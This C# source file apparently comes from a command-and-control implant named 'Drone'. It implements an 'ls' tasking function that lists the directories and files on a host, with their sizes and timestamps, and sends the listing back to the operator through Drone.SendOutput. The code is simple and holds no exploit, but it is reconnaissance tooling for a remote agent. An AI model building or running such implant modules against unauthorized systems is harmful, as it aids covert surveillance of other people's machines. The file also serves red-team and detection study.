using System;
using System.IO;
using System.Collections.Generic;

using Drone.Models;

namespace Drone.Functions;

public class ListDirectory : DroneFunction
{
    public override string Name => "ls";
    
    public override void Execute(DroneTask task)
    {
        var path = task.Parameters.Length == 0
            ? Directory.GetCurrentDirectory()
            : task.Parameters[0];

        ResultList<ListDirectoryResult> results = new();

        foreach (var directory in Directory.GetDirectories(path))
        {
            var info = new DirectoryInfo(directory);
            results.Add(new ListDirectoryResult
            {
                Name = info.FullName,
                Length = 0,
                CreationTime = info.CreationTimeUtc,
                LastAccessTime = info.LastAccessTimeUtc,
                LastWriteTime = info.LastWriteTimeUtc
            });
        }

        foreach (var file in Directory.GetFiles(path))
        {
            var info = new FileInfo(file);
            results.Add(new ListDirectoryResult
            {
                Name = info.FullName,
                Length = info.Length,
                CreationTime = info.CreationTimeUtc,
                LastAccessTime = info.LastAccessTimeUtc,
                LastWriteTime = info.LastWriteTimeUtc
            });
        }
        
        Drone.SendOutput(task.TaskId, results.ToString());
    }
}

public class ListDirectoryResult : Result
{
    public string Name { get; set; }
    public long Length { get; set; }
    public DateTime CreationTime { get; set; }
    public DateTime LastAccessTime { get; set; }
    public DateTime LastWriteTime { get; set; }

    protected internal override IList<ResultProperty> ResultProperties => new List<ResultProperty>
    {
        new() { Name = "Name", Value = Name },
        new() { Name = "Length", Value = Length },
        new() { Name = "Created", Value = CreationTime },
        new() { Name = "Accessed", Value = LastAccessTime },
        new() { Name = "Written", Value = LastWriteTime }
    };
}